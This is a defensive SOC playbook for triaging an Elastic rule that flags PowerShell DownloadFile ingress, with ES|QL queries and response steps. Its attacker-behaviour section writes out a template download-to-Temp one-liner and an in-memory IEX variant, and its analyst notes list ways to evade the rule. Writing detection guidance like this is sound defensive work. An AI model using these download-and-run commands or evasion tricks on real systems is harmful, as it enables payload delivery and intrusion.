# Powershell DownloadFile — SOC Investigation Playbook

**Rule ID:** `1bae4afe-c59b-4d88-91bc-b7c1d44402fa` · **Type:** query · **Language:** kuery · **Severity:** High · **Confidence:** Medium · **Platform:** Elastic Security (NBI)
**Primary index (live):** `logs-system.security-*` (Windows Security Event 4688) · **Corroborating index (live):** `logs-windows.powershell-*` (Event 4104) · **Alert entities:** `$host`, `$user`

> Substitute the alert's real values for the `$vars` before running any query. This playbook was authored and live-validated against NBI telemetry with `$host = nim-st-apv10` and `$user = NIM-ST-APV10$` (a real automation host that runs `powershell.exe` heavily — ~282 executions/4h under that machine account, with **command-line auditing enabled** so `process.command_line`/`process.args` are populated, and ~1.1k PowerShell 4104 script-block events/4h). A literal `DownloadFile` invocation had **0 matches in-window** (as the deployed rule itself notes), so the `DownloadFile`-specific anchor queries are correct and executable but return no rows until the rule fires; the host-scoped PowerShell and script-block pivots return real rows. Every ES|QL block below executed successfully on the live NBI cluster.

---

## 1. Purpose

This playbook drives triage and investigation of the **Powershell DownloadFile** detection on NBI's Elastic Security deployment. The rule fires on a `powershell.exe` process (Windows Security **4688**) whose command line contains **`DownloadFile`** — the `System.Net.WebClient.DownloadFile` method (and its `DownloadString`/`DownloadData` siblings), which fetches a file from a remote URL to local disk. It is one of the most common ways an attacker pulls a second-stage payload or tool onto a host after initial access (Ingress Tool Transfer).

Ingress by itself is not proof of compromise — admins and installers download files too — so the decision turns on three facts recoverable from the command line and the process tree: the **source URL** (internal/trusted vs an unknown internet address or raw IP), the **destination path** (a normal software location vs `Temp`/`AppData`/`Public`/`Downloads` staging), and, decisively, **whether the downloaded file then executed**. Verdicts: a payload pulled from an untrusted source and run (**true_positive**), an authorised admin/software download or a positively-blocked attempt (**false_positive** — the latter documented as blocked-malicious, **never "benign"**), a legitimate script/agent using `DownloadFile` not yet baselined (**misconfiguration**), or unresolved (**needs_escalation**).

## 2. Detection Summary

The deployed rule is a **KQL (`query`) rule** on `logs-system.security-*`:

```kql
process.name : "powershell.exe" and process.args : "*DownloadFile*"
```

Plain English: a `powershell.exe` process creation whose arguments contain the literal string `DownloadFile`. On NBI this is anchored to Event **4688**; the argument match is evaluated against `process.args` (multivalued) and, equivalently, `process.command_line`.

The rule is **content-based**, so it depends on command-line/argument capture — which on NBI is only ~50% populated estate-wide (see §8). Where a host does not audit command lines, a real `DownloadFile` can fire nothing here; the complementary **PowerShell script-block log** (`logs-windows.powershell-*`, Event 4104) recovers the *decoded* call independently (§15.2b) and is the durable corroborator.

## 3. Alert Meaning

An alert means: **on `$host`, `$user` ran PowerShell whose command line invoked `DownloadFile` (or a `Download*` WebClient method) to fetch a file from a URL to local disk.** The `WebClient.DownloadFile(url, path)` call takes exactly two operands — the remote source and the local destination — and both are visible in the command line when the host captures it.

The download *happened*; what it means depends on the operands and the follow-on:

- **Source URL** — an internal server or a signed software CDN leans benign; an unknown domain, a raw IP, a non-standard port, or a paste/tunnelling service (`pastebin`, `trycloudflare`, `ngrok`) leans malicious.
- **Destination path** — a normal install location is expected; `Users\…\Downloads`, `\AppData\Local\Temp`, `\Public`, or `ProgramData` with a random name is payload staging.
- **Execution** — a new process starting from that staging path shortly after, or a PowerShell child (`rundll32`/`regsvr32`/`mshta`/an unsigned `.exe`), turns ingress into an active foothold.

## 4. Typical Attacker Behavior

`DownloadFile` is a workhorse of the ingress-tool-transfer step:

1. The attacker has a foothold (a macro, an exploited service, a hands-on session) and needs to pull a **second stage** — a loader, beacon, credential tool, or ransomware component.
2. They run a PowerShell one-liner: `(New-Object Net.WebClient).DownloadFile('http://<host>/<payload>', "$env:TEMP\<name>.exe")` — or the `DownloadString`/`DownloadData` + `IEX` variant to run it in memory.
3. The file lands in a **staging path** (`Temp`/`AppData`/`Public`/`Downloads`), often with a random or masquerading name.
4. They **execute** it — directly, or via `rundll32`/`regsvr32`/`mshta`, or by `IEX`-ing downloaded content — establishing the foothold.
5. Follow-on: discovery (`whoami`/`net`/`nltest`), credential access, persistence, and lateral movement; the download URL is C2 or a staging server.

Give-aways: an untrusted URL, a staging destination path, a delivery-chain parent (Office/`wscript`/`mshta`/a browser), and a new process from the staging path or a PowerShell child right after the download.

## 5. Common False Positives

- **Administrator/software downloads** — an engineer or a packaging script pulling an installer/tool from an internal repository or a signed vendor CDN to a normal location. Authorisation and source must be **positively confirmed** against the account's role and a change record, not assumed.
- **Deployment/management agents** (SCCM-style, RMM, config-management) that use `DownloadFile` as packaged behaviour to fetch from a trusted source — often many hosts under one deployment parent.
- **Administrator or red/purple-team testing** of ingress tooling — authorised malicious-technique execution, classified **false_positive (blocked/authorised)** only against a ticket or ROE, never dismissed on sight.

The discriminators are always the **URL**, the **destination path**, the **parent**, and **whether it executed** — a trusted URL to a normal path under a deployment parent with no follow-on is the benign shape.

## 6. Environment-Specific False Positives (NBI)

Validated against NBI's live telemetry:

- **`process.command_line`/`process.args` is bimodal (~50% estate-wide).** It is fully populated on the automation tier (`nim-st-apv10`/`-apv11` ~100%) and frequently **null** on other hosts. A real `DownloadFile` on a command-line-blind host fires nothing on 4688 — so an empty §14.2 **does not clear the host**; pivot to the PowerShell script-block log (§15.2b).
- **PowerShell is common but `DownloadFile` is not.** `powershell.exe` runs ~600×/4h estate-wide, dominated by machine-account automation (`NIM-ST-APV10$`/`NIM-ST-APV11$` under a `python.exe` parent running `-EncodedCommand`); a literal `DownloadFile` had **0** in-window occurrences. A hit is therefore high-signal and must be judged on the URL, path, and execution — not dismissed as "just automation".
- **Script-block logging is live on the automation tier** (`logs-windows.powershell-*`, ~1.1k 4104 events/4h on `nim-st-apv10`/`-apv11`), and `powershell.file.script_block_text` recovers the decoded call. Note its own `user.name` is `SYSTEM` and `powershell.connected_user.name` is null on NBI — **key script-block pivots on `host.name`**.
- **No historical NBI benign-true-positive is on record for this rule.** Do not blanket-except a host/URL; scope any exception to the exact URL + destination + parent + account after a documented authorised cause.

## 7. Investigation Prerequisites

- Access to NBI Elastic Security (Discover, Timeline, Alerts) and the `_query` ES|QL API, read-only.
- The alert's entity values: `host.name` (`$host`), the acting `user.name` (`$user`), `process.parent.name`, and the `process.command_line`/`process.args` carrying the URL and destination path.
- Awareness of NBI's telemetry reality (§8): **Windows Security 4688 + PowerShell 4104 only; no Sysmon/EDR; no process hashes; no network/DNS events; host-dependent command-line capture; the downloaded bytes and the URL's reputation are not in telemetry** — recover the file from the host and enrich the URL/IP externally. These gaps are marked `N/A` in §15 with the honest reason and the closest substitute.
- A tight incident window: every query below is pinned to `@timestamp >= NOW() - 4 hours`.

## 8. Required Data Sources

**Live and used by this playbook:**

- **`logs-system.security-*`** — Windows Security Event Log; the index the rule uses. Event **4688** is the anchor (the `powershell.exe` process + its command line). Supporting events used in pivots: **4624/4625/4634/4647** (logon/logoff), **4648** (explicit-credential logon), **4672** (special privileges), **4698/7045/4720** (persistence), **4768/4769** (Kerberos), **5140/5145** (share access), **1102/4719** (log/audit tampering).
- **`logs-windows.powershell-*`** — PowerShell operational log. Event **4104** (script-block logging) records the **decoded** script content in `powershell.file.script_block_text` (a `wildcard` field → match with `TO_LOWER(...) LIKE`). This recovers the `DownloadFile`/`DownloadString`/`Invoke-WebRequest` call and the URL even when 4688's command line is null.

**Field population (measured live on NBI):**

| Field | Population | Note |
|---|---|---|
| `process.name`, `process.executable` | ~100% (4688) | The PowerShell image + full path; child image path in the execution pivot. |
| `process.parent.name` | ~99.7% (4688) | The launcher — delivery-chain vs deployment/admin. |
| `user.name`, `winlog.event_data.SubjectUserName` | ~100% (4688) | Acting user; equal on 4688. `TargetUserName` is null on 4688 — key on `user.name`. |
| `process.command_line`, `process.args` (multivalued) | **host-dependent (~50%)** | Carries the URL + destination path. Recover with `MV_CONCAT(process.args, " ")`; null on the command-line-blind tier. |
| `powershell.file.script_block_text` | on 4104 (automation tier live) | Decoded script content — the durable corroborator; `wildcard` type → `TO_LOWER(...) LIKE`. Key on `host.name`. |

**Declared/available but DEAD in NBI (0 docs — never query):** `winlogbeat-*`, `logs-windows.forwarded*`, `logs-windows.sysmon_operational-*`, `logs-endpoint.events.*`, `logs-crowdstrike.fdr*`.

**Telemetry-blocked signals (state plainly):** the **downloaded bytes and the URL's reputation** are not in telemetry (retrieve the file from the host; enrich the domain/IP externally); **no process hashes** (`process.hash.*` absent on 4688); **no process network/DNS** (Elastic Defend/Sysmon dead) so the download's network leg cannot be pivoted in-index. **Empty result ≠ safe:** in-memory execution and delayed detonation, and command-line-blind hosts, all leave little or no 4688 trace.

## 9. MITRE ATT&CK Mapping

From the rule's declared technique set:

- **Tactic: Command and Control (TA0011)** — https://attack.mitre.org/tactics/TA0011/
- **Tactic: Execution (TA0002)** — https://attack.mitre.org/tactics/TA0002/
- **Technique: T1105 — Ingress Tool Transfer** — https://attack.mitre.org/techniques/T1105/
- **Sub-technique: T1059.001 — Command and Scripting Interpreter: PowerShell** — https://attack.mitre.org/techniques/T1059/001/

The behaviour is ingress (pulling a file over the network) executed via PowerShell — the bridge from a foothold to a second-stage tool.

## 10. Severity Guidance

Deployed severity is **High** (confidence Medium). Adjust the *effective* incident priority:

- **Raise toward critical** when: the URL is an unknown domain / raw IP / paste-tunnelling service (§14.2/§15.2b), the destination is a staging path (§15.10), the parent is a delivery chain (Office/`wscript`/`mshta`/browser — §15.3), the payload **executed** (§17.5), or the host is a server/DC/privileged workstation.
- **Keep at high** for any confirmed `DownloadFile` from an unverified source with no authorised explanation, even when the command line is null on 4688 (corroborate via script-block §15.2b).
- **Lower only** to **false_positive (authorised)** when the source URL, destination, parent, and account role are positively confirmed as sanctioned admin/software/deployment for this exact host + user + time.

## 11. Triage Process (Tier 1)

Target: reach a hold/confirm/escalate decision in ~15 minutes.

1. **Read the alert entities.** Note `$host`, `$user`, `process.parent.name`, and the timestamp.
2. **Recover the URL and destination path** (§14.2): read `process.command_line` and `MV_CONCAT(process.args, " ")`. If the command line is null, recover the decoded call from the script-block log (§15.2b).
3. **Judge the URL and path.** Untrusted URL + staging destination (`Temp`/`AppData`/`Public`/`Downloads`) is the intrusion pattern; trusted URL + normal path leans authorised.
4. **Identify the launcher** (§15.3). A delivery-chain parent (Office/`wscript`/`mshta`/browser) is highly suspicious; a deployment agent or `explorer.exe` leans administrative.
5. **Check for execution** (§17.5): a new process from the staging path or a PowerShell child right after the download turns ingress into a foothold.
6. **Decide:** untrusted source + staging + execution → escalate as **true_positive**; positively confirmed authorised download → **false_positive (authorised)**; blocked attempt → **false_positive (blocked-malicious)**; URL/path/execution unrecoverable → **needs_escalation**. Never close as benign without proof.

## 12. Investigation Workflow (Tier 2 / Tier 3)

1. **Recover the download command** (§14.2) and its decoded form (§15.2b) — the URL and destination path are the primary evidence.
2. **Characterise the URL/domain** — reputation, age, hosting, and whether it is internal/trusted — via external enrichment (not in telemetry).
3. **Identify the launcher** (§15.3) and scope the account/host (§15.4, §15.5).
4. **Determine execution** (§17.5): a process from the staging path or a PowerShell child (`rundll32`/`regsvr32`/`mshta`/unsigned `.exe`) is download-then-run.
5. **Validate the attack chain** (§17): lateral movement (§17.1), persistence (§17.2), privilege state (§17.3), defence evasion (§17.4), and impact (§17.5).
6. **Build the timeline** (§16) so download → execution → follow-on is explicit.
7. **Escalate to Tier 3 / IR** if a payload from an untrusted source executed, or a delivery-chain parent / privileged host is involved (§21).

## 13. Decision Tree

```
Alert: powershell.exe invoked DownloadFile on $host under $user (§14 confirms the 4688 / §15.2b the decoded call)
│
├─ URL + destination not recoverable (command line null AND no script-block content)
│     → needs_escalation — L2/IR retrieve the file + execution evidence from the host
│
├─ Recovered → judge URL + destination + parent + execution
│   │
│   ├─ Authorised admin/software/deployment: internal/trusted URL, normal destination,
│   │   deployment/admin parent, consistent with role — positively confirmed
│   │     → false_positive (authorised download) — document source + ticket
│   │
│   ├─ Malicious attempt positively proven blocked (download or its execution prevented by
│   │   EDR/network controls, no successful run)
│   │     → false_positive (blocked-malicious — documented as such, never "benign")
│   │
│   ├─ Legitimate script/agent uses DownloadFile from a trusted source as packaged behaviour,
│   │   simply not yet baselined (recognised URL/parent, benign, no suspicious execution)
│   │     → misconfiguration — baseline it; prefer signed packages / approved repositories
│   │
│   └─ Untrusted URL / raw IP writing to a staging path  AND/OR delivery-chain parent
│       AND/OR the payload executed (§17.5)
│         → true_positive — proceed to Containment (§18); escalate per §21
│
└─ (default) evidence incomplete / ambiguous → needs_escalation with the gaps noted
```

## 14. Validation Queries

### 14.1 Reproduce the rule estate-wide (confirm the detection logic)

Confirms whether any `powershell.exe` invoked `DownloadFile` anywhere in the window. On NBI this is normally 0 (no in-window occurrence); a non-zero result is immediately notable. `process.args` is folded in so hosts that populate args but not `command_line` still match.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4688" AND TO_LOWER(process.name) == "powershell.exe"
| EVAL cl = TO_LOWER(CONCAT(COALESCE(process.command_line, ""), " ", COALESCE(MV_CONCAT(process.args, " "), "")))
| WHERE cl LIKE "*downloadfile*"
| KEEP @timestamp, host.name, user.name, process.parent.name, process.command_line
| SORT @timestamp DESC
| LIMIT 100
```

### 14.2 Confirm on the alert host: source URL and destination path

Scopes to `$host` + `$user` and recovers the `DownloadFile` command line — the URL and the local destination. Reused verbatim from the validated deployed playbook.

```esql
FROM logs-system.security-*
| WHERE event.code == "4688" AND process.name == "powershell.exe"
    AND host.name == "$host" AND user.name == "$user"
    AND process.command_line LIKE "*DownloadFile*"
    AND @timestamp >= NOW() - 4 hours
| KEEP @timestamp, process.command_line, process.parent.name
| SORT @timestamp DESC
| LIMIT 20
```

## 15. Investigation Queries — Entity Pivots

### 15.1 Entity pivoting

Anchor on the alert's entity set: all `powershell.exe` executions on `$host` for `$user` with their command lines and parents, so the download context and every downstream `$var` is confirmed from real data (and the `DownloadFile` line sits among the account's normal PowerShell activity).

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4688" AND TO_LOWER(process.name) == "powershell.exe"
    AND host.name == "$host" AND user.name == "$user"
| EVAL argline = MV_CONCAT(process.args, " ")
| KEEP @timestamp, process.parent.name, process.command_line, argline, process.pid, process.parent.pid
| SORT @timestamp DESC
| LIMIT 50
```

### 15.2 Process investigation

**15.2a — Estate prevalence of PowerShell `DownloadFile`.** How common is this exact behaviour across the estate, and under which parents/users? A first-seen or single-user occurrence is high-signal; a broad deployment pattern leans benign.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4688" AND TO_LOWER(process.name) == "powershell.exe"
| EVAL cl = TO_LOWER(CONCAT(COALESCE(process.command_line, ""), " ", COALESCE(MV_CONCAT(process.args, " "), "")))
| WHERE cl LIKE "*downloadfile*" OR cl LIKE "*downloadstring*" OR cl LIKE "*downloaddata*"
| STATS occurrences = COUNT(*), hosts = COUNT_DISTINCT(host.name), users = COUNT_DISTINCT(user.name) BY process.parent.name
| SORT occurrences DESC
| LIMIT 25
```

**15.2b — Decoded PowerShell content from the script-block log (the durable corroborator).** `logs-windows.powershell-*` 4104 records the **decoded** script even when 4688's command line is null. Recovers the ingress call and its URL on `$host`; `powershell.file.script_block_text` is a `wildcard` field, keyed on `host.name` (the operational log's `user.name` is `SYSTEM`).

```esql
FROM logs-windows.powershell*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4104" AND host.name == "$host"
    AND (TO_LOWER(powershell.file.script_block_text) LIKE "*downloadfile*"
         OR TO_LOWER(powershell.file.script_block_text) LIKE "*downloadstring*"
         OR TO_LOWER(powershell.file.script_block_text) LIKE "*downloaddata*"
         OR TO_LOWER(powershell.file.script_block_text) LIKE "*invoke-webrequest*"
         OR TO_LOWER(powershell.file.script_block_text) LIKE "*start-bitstransfer*"
         OR TO_LOWER(powershell.file.script_block_text) LIKE "*net.webclient*")
| KEEP @timestamp, host.name, powershell.file.script_block_text
| SORT @timestamp DESC
| LIMIT 20
```

### 15.3 Parent-Child process analysis

Who launched the download — the parent processes behind PowerShell `DownloadFile` on `$host`. Reused from the validated deployed playbook: a delivery-chain parent (Office/`wscript`/`mshta`/browser) is highly suspicious; a deployment agent or `explorer.exe` leans administrative; many users under one deployment parent suggests a fleet rollout.

```esql
FROM logs-system.security-*
| WHERE event.code == "4688" AND process.name == "powershell.exe"
    AND host.name == "$host" AND process.command_line LIKE "*DownloadFile*"
    AND @timestamp >= NOW() - 4 hours
| STATS downloads = COUNT(*), users = COUNT_DISTINCT(user.name)
    BY process.parent.name
| SORT downloads DESC
| LIMIT 15
```

### 15.4 User investigation

Where has `$user` executed processes, and how broad is their footprint in the window? A machine/service account confined to one host vs an interactive user spanning many hosts is important context for whether a `DownloadFile` is routine or anomalous.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4688" AND user.name == "$user"
| STATS executions = COUNT(*), distinct_procs = COUNT_DISTINCT(process.name) BY host.name
| SORT executions DESC
| LIMIT 20
```

### 15.5 Host investigation

Baseline the host's PowerShell activity — the parents and users driving `powershell.exe` — so an out-of-place download parent or user stands out against routine automation.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4688" AND TO_LOWER(process.name) == "powershell.exe"
    AND host.name == "$host"
| STATS executions = COUNT(*), users = COUNT_DISTINCT(user.name) BY process.parent.name
| SORT executions DESC
| LIMIT 30
```

### 15.6 IP investigation

Where did `$user` log in from on `$host`? `source.ip` is present on network (type 3) and RDP (type 10) logons and null on local interactive (type 2). This anchors the human/host origin behind the download session; the **download's own URL/IP** is in the command line (§14.2/§15.2b), not a network field on this index.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4624"
    AND host.name == "$host" AND user.name == "$user"
    AND source.ip IS NOT NULL
| STATS logons = COUNT(*) BY source.ip, winlog.event_data.LogonType
| SORT logons DESC
| LIMIT 20
```

### 15.7 Domain investigation

N/A — DNS/network-domain telemetry is not collected on NBI (no Sysmon, no Elastic Defend network/DNS). The **download's domain lives inside the command line / script-block text** (recover via §14.2/§15.2b); it is not resolvable as a DNS pivot in-index. Alternative: enrich the extracted domain externally (reputation/WHOIS/passive DNS) and pivot the host's IP in `logs-fortinet_fortigate.log-*` out of band to see the egress.

### 15.8 URL investigation

N/A as a field pivot — there is no URL field on Windows 4688/4104. The download URL is embedded in the PowerShell command line (`process.command_line`/`process.args`, §14.2) and in the decoded script block (`powershell.file.script_block_text`, §15.2b) — extract it from there. Alternative: submit the extracted URL to URL reputation/sandbox tooling, and correlate against FortiGate/FortiWeb web logs by the host's IP if this escalates to network investigation.

### 15.9 Hash investigation

N/A — process/file hashes are not collected on NBI (`process.hash.*` absent on 4688; no Sysmon/EDR). The downloaded file's hash cannot be obtained from telemetry. Alternative: retrieve the file from the destination path on `$host` during response, compute its SHA-256 with `Get-FileHash`, and check reputation (VirusTotal/Talos/Hybrid-Analysis) out of band.

### 15.10 File investigation

The strongest file artifact available is **what ran from a staging path** after the download — a proxy for the destination file executing. Reused from the validated deployed playbook: processes starting from `Temp`/`AppData`/`Downloads`/`Public`, or any PowerShell child, on `$host`. A process from a staging path shortly after the download is download-then-run.

```esql
FROM logs-system.security-*
| WHERE event.code == "4688" AND host.name == "$host" AND @timestamp >= NOW() - 4 hours
    AND (process.executable LIKE "*Temp*" OR process.executable LIKE "*AppData*"
         OR process.executable LIKE "*Downloads*" OR process.executable LIKE "*Public*"
         OR process.parent.name == "powershell.exe")
| STATS spawns = COUNT(*), procs = VALUES(process.name)
    BY process.parent.name, user.name
| SORT spawns DESC
| LIMIT 20
```

Note: the **downloaded bytes** themselves are not captured on NBI (no Sysmon file-create). Recover the file from the destination path host-side.

### 15.11 Email investigation

N/A — no email/message telemetry is in scope for this host-based execution alert on NBI (`logs-m365_defender.*` carries alerts only). If the PowerShell download followed a phishing foothold, pivot the mail-security stack out of band using `$user` as the recipient over the incident timeframe.

### 15.12 Authentication investigation

Reconstruct `$user`'s logon/logoff activity on `$host` to bound the session in which the download ran and spot anomalies. Keyed on `user.name` — the reliable entity key on NBI (`winlog.event_data.TargetUserName` is null on 4688). For a machine account (`…$`), expect service/network logons rather than interactive.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code IN ("4624", "4625", "4634", "4647")
    AND host.name == "$host" AND user.name == "$user"
| STATS events = COUNT(*), first_seen = MIN(@timestamp), last_seen = MAX(@timestamp) BY event.code, winlog.event_data.LogonType, source.ip
| SORT events DESC
| LIMIT 30
```

## 16. Timeline Reconstruction

Build a time-ordered process-creation stream for `$user` on `$host`. Because `process.pid`/`process.parent.pid` are ~100% populated, the chain (e.g. `parent → powershell.exe → <staging-path>.exe`) is legible directly, letting you place download → execution → follow-on in sequence against surrounding activity.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4688" AND host.name == "$host" AND user.name == "$user"
| KEEP @timestamp, process.parent.name, process.parent.pid, process.name, process.pid, process.executable
| SORT @timestamp ASC
| LIMIT 200
```

Anchor the read on the alert timestamp and read outward. Cross-reference the PowerShell 4104 script-block timeline (§15.2b) for the decoded call where 4688 command lines are null.

## 17. Attack-Chain Validation

### 17.1 Lateral movement validation

Did `$user` authenticate or reach shares on hosts **other than** `$host` after the download? Network/explicit-credential logons and Kerberos ticketing to new systems, or admin-share access, are the signal that an ingressed tool is being used to spread.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code IN ("4624", "4648", "4768", "4769", "5140")
    AND user.name == "$user"
    AND host.name != "$host"
| STATS events = COUNT(*) BY host.name, event.code, winlog.event_data.LogonType
| SORT events DESC
| LIMIT 30
```

### 17.2 Persistence validation

Look for persistence primitives on `$host` in the window — service installs (`7045`), scheduled tasks (`4698`), account creation (`4720`), and 4688 executions of `schtasks.exe`/`reg.exe`/`sc.exe`/interpreters that a downloaded payload would use to persist.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND host.name == "$host"
    AND (
        (event.code == "4688" AND TO_LOWER(process.name) IN ("schtasks.exe", "reg.exe", "sc.exe", "at.exe", "powershell.exe", "wscript.exe", "cscript.exe", "rundll32.exe", "mshta.exe"))
        OR event.code == "7045"
        OR event.code == "4720"
        OR event.code == "4698"
    )
| STATS events = COUNT(*) BY event.code, process.name, user.name
| SORT events DESC
| LIMIT 40
```

### 17.3 Privilege escalation validation

Enumerate which accounts received **special (admin-equivalent) privileges** on `$host` via Event 4672, and compare against `$user`. A downloaded payload that runs under a non-privileged user, followed by that user appearing in 4672, indicates a local privilege-escalation follow-on after the ingress.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4672" AND host.name == "$host"
| STATS special_priv_logons = COUNT(*) BY user.name
| SORT special_priv_logons DESC
| LIMIT 25
```

### 17.4 Defense evasion validation

Check for evidence-destruction / defence-tampering on `$host`: log clearing (`1102`), audit-policy change (`4719`), and 4688 executions of `wevtutil.exe`/`fsutil.exe`/`vssadmin.exe`/`wmic.exe`/`cipher.exe`. A payload that clears logs or deletes shadow copies right after the download strongly corroborates a true positive; absence is not exoneration given the network/hash gaps.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND host.name == "$host"
    AND (
        (event.code == "4688" AND TO_LOWER(process.name) IN ("wevtutil.exe", "fsutil.exe", "vssadmin.exe", "wmic.exe", "cipher.exe", "sdelete.exe", "sdelete64.exe"))
        OR event.code == "1102"
        OR event.code == "4719"
    )
| STATS events = COUNT(*) BY event.code, process.name, user.name
| SORT events DESC
| LIMIT 30
```

### 17.5 Impact assessment

Determine whether the downloaded payload **executed** — the pivot from ingress to active foothold. Reused from the validated deployed playbook: processes starting from a staging path, or PowerShell children, on `$host`. Recon/lateral tooling (`net`/`whoami`/`nltest`/`cmd`) or an unsigned binary from a user path is hands-on activity.

```esql
FROM logs-system.security-*
| WHERE event.code == "4688" AND host.name == "$host" AND @timestamp >= NOW() - 4 hours
    AND (process.executable LIKE "*Temp*" OR process.executable LIKE "*AppData*"
         OR process.executable LIKE "*Downloads*" OR process.executable LIKE "*Public*"
         OR process.parent.name == "powershell.exe")
| STATS spawns = COUNT(*), distinct_children = COUNT_DISTINCT(process.name), procs = VALUES(process.name)
    BY process.parent.name, user.name
| SORT spawns DESC
| LIMIT 20
```

## 18. Containment

- **Isolate `$host`** (network-contain / quarantine) if a true_positive is confirmed, to stop the payload's C2 and any post-download activity.
- **Capture the downloaded file and its URL** before eradication: retrieve the file from the destination path (§14.2/§15.10) for analysis, and record the URL/IP for blocking.
- **Terminate the PowerShell process and any child launched from the staging path** (§17.5) if the host cannot yet be isolated.
- **Suspend/disable `$user`** and reset its credentials (§20) if the account is implicated; for a machine/service account, coordinate with the owning team.
- **Block the source URL/domain/IP** at the proxy/firewall once identified. Deploy changes only via the authorised human-approved DEPLOY path; investigation itself is read-only.

## 19. Eradication

- **Remove the downloaded payload** from the destination path and any copies, plus the persistence discovered in §17.2 (services, scheduled tasks, Run keys, rogue accounts).
- **Block the delivery infrastructure** (URL, domain, IP, hosting range) across the proxy/firewall and endpoints; add the payload hash to endpoint blocklists once computed (§15.9).
- **Run a full anti-malware / EDR scan** on `$host` and hunt the same URL/hash and download pattern across peers, especially hosts `$user` reached (§15.4, §17.1).
- **Remediate the initial-access vector** that placed the foothold from which the download ran (macro, exploited service, prior credential compromise).

## 20. Recovery

- **Reset `$user`'s credentials** and any exposed on `$host` during the window; if privileged accounts logged on there (§17.3), rotate those too.
- **Restore `$host`** from a known-good image if persistence or tampering was extensive; otherwise validate eradication holds after reboot.
- **Return the host/account to service** only after §22 closing criteria are met and monitoring confirms no recurrence of the download pattern or C2.
- Recommend hardening (§23): restrict outbound access from servers/workstations to approved destinations, enforce signed-script / Constrained Language Mode, ensure command-line and PowerShell script-block/module logging are enabled estate-wide, and baseline sanctioned `DownloadFile`-using automation so novel ingress stands out.

## 21. Escalation Criteria

Escalate to Tier 3 / Incident Response (and notify the customer) when **any** of the following hold:

- The download source is an untrusted URL / raw IP / paste-tunnelling service (§14.2/§15.2b), or the destination is a staging path (§15.10).
- The launcher is a delivery chain (Office/`wscript`/`mshta`/browser — §15.3), or the payload **executed** (§17.5).
- Persistence (§17.2), lateral movement (§17.1), or privilege escalation (§17.3) is observed, or the host is a server/DC/privileged workstation.
- Log clearing / shadow-copy deletion appears (§17.4).
- The URL/destination or execution outcome cannot be established (command-line-blind host, no script-block, host unavailable) and the alert cannot be safely cleared — escalate as **needs_escalation** with the gaps named.

## 22. Closing Criteria

- **false_positive (authorised):** the source URL, destination, parent, and account role are positively confirmed as sanctioned admin/software/deployment for this exact `$host` + `$user` + time. Record the reference; scope any exception to that exact tuple.
- **false_positive (blocked-malicious):** the download or its payload's execution was positively proven prevented by EDR/network controls with no successful run; documented as blocked-malicious, **never "benign"** — still hunt the delivery vector.
- **misconfiguration:** a legitimate script/agent fetches from a trusted source via `DownloadFile` as packaged behaviour and simply was not baselined; baseline it and prefer signed packages / approved repositories.
- **true_positive:** payload ingress from an untrusted source (and/or execution) confirmed; containment/eradication/recovery completed, scope established, URL/infrastructure blocked, and no residual persistence or recurrence.
- **needs_escalation:** handed to Tier 3/IR with the specific evidence gaps documented.

In all cases: attach the ES|QL used and its results, the entity values, the source URL + destination path (or the note that they were unavailable), and the classification rationale to the alert before closing.

## 23. Analyst Notes

- **The URL, the path, and execution decide it.** An untrusted source writing an executable to a staging path that then runs is the true-positive core; a trusted source to a normal path under a deployment parent with no follow-on is the benign shape. `DownloadFile` alone is neutral.
- **Command line is bimodal; the script-block log is the safety net.** Recover the call from `process.command_line`/`MV_CONCAT(process.args," ")` (§14.2) and, where those are null, from `logs-windows.powershell-*` 4104 `script_block_text` (§15.2b). Key the script-block pivot on `host.name` — its `user.name` is `SYSTEM` and `connected_user.name` is null on NBI.
- **`script_block_text` is a `wildcard` field.** Match it with `TO_LOWER(...) LIKE "*…*"`, never full-text `MATCH`.
- **The rule is literal-string-bound; evasion is easy.** `Invoke-WebRequest`/`iwr`, `Start-BitsTransfer`, `curl.exe`, `certutil -urlcache`, or hiding the call in `-EncodedCommand` all achieve the same ingress without the literal `DownloadFile`. The script-block markers in §15.2b (and a complementary ingress-tool-transfer analytic) cover these; a null §14.2 never clears the host.
- **`winlog.event_data.TargetUserName` is null on 4688** — key process/user pivots on `user.name`.
- **The bytes and the network are invisible here.** Retrieve the file host-side for hashing/analysis and enrich the URL/IP externally; empty in-index network/hash results never clear the host.
- **KB-worthy (persist to NBI customer scope):** (1) `powershell.exe` ~600/4h estate-wide, dominated by `NIM-ST-APV10$`/`NIM-ST-APV11$` under `python.exe` running `-EncodedCommand`; literal `DownloadFile` = 0 in-window; (2) `process.command_line`/`args` ~50% bimodal, ~100% on `nim-st-apv10`/`-apv11`; (3) `logs-windows.powershell-*` 4104 ~1.1k/4h on those hosts, `script_block_text` wildcard, `connected_user.name` null → key on host; (4) `winlog.event_data.TargetUserName` null on 4688. Observed live 2026-08-19.

## 24. References

- MITRE ATT&CK — Ingress Tool Transfer (T1105): https://attack.mitre.org/techniques/T1105/
- MITRE ATT&CK — Command and Scripting Interpreter: PowerShell (T1059.001): https://attack.mitre.org/techniques/T1059/001/
- MITRE ATT&CK — Command and Control tactic (TA0011): https://attack.mitre.org/tactics/TA0011/
- MITRE ATT&CK — Execution tactic (TA0002): https://attack.mitre.org/tactics/TA0002/
- Elastic Security — PowerShell suspicious download / Ingress Tool Transfer rules: https://github.com/elastic/detection-rules
- Microsoft Learn — about_PowerShell_Logging / Script Block Logging (Event 4104): https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows
